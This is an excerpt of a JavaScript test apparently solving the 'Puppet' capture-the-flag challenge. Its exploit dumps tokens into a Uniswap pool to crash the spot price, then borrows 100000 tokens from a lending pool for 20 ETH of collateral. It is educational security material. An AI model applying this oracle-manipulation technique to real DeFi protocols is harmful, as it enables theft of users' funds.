...
describe('[Challenge] Puppet', function () {
    ...
    it('Exploit', async function () {
        ...
        const uniswapExchange = this.uniswapExchange.connect(attacker);
        let tx = await this.token.connect(attacker).approve(uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await tx.wait();

        tx = await uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), ethers.utils.parseEther('1.0'), (await ethers.provider.getBlock('latest')).timestamp * 2, { gasLimit: 3e7});
        await tx.wait();

        const lenderPool = this.lendingPool.connect(attacker);
        tx = await lenderPool.borrow(ethers.utils.parseEther('100000'), { value : ethers.utils.parseEther('20')});
        await tx.wait();
    });
